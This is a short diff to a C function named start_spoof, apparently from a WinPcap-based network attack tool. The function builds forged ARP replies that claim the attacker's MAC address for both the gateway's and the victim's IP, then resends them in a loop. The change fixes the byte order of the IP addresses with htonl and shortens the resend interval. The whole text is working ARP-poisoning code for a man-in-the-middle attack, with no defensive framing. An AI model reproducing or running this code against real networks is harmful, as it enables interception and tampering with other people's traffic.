@@ -14,8 +14,8 @@ DWORD WINAPI start_spoof(LPVOID lparam)
 	/* build the packets */
 	build_packet(
 		victim_packet,
-		infect_params.gateway_ip,
-		infect_params.victim_ip,
+		htonl(infect_params.gateway_ip),
+		htonl(infect_params.victim_ip),
 		infect_params.adapter->Address,
 		infect_params.victim_mac,
 		2 
@@ -23,8 +23,8 @@ DWORD WINAPI start_spoof(LPVOID lparam)
 
 	build_packet(
 		gateway_packet,
-		infect_params.victim_ip,
-		infect_params.gateway_ip,
+		htonl(infect_params.victim_ip),
+		htonl(infect_params.gateway_ip),
 		infect_params.adapter->Address,
 		infect_params.gateway_mac,
 		2
@@ -35,7 +35,7 @@ DWORD WINAPI start_spoof(LPVOID lparam)
 	{
 		pcap_sendpacket(infect_params.fp, victim_packet, pack_size);
 		pcap_sendpacket(infect_params.fp, gateway_packet, pack_size);
-		Sleep(3000); 
+		Sleep(2000); 
 	}
 
 }
